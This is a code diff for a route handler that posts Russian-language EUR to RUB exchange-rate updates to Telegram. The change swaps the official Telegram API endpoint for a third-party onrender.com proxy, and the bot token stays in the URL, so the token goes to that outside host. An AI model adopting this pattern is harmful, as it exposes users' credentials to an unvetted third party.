@@ -78,7 +78,7 @@ export async function POST(request: NextRequest) {
     }
 
     const text = `📈 КУРС ОБНОВЛЕН: 1 EUR = ${rate} RUB.`;
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const url = `https://telegram-proxy-bridge.onrender.com/bot${token}/sendMessage`;
 
     const res = await fetch(url, {
       method: "POST",
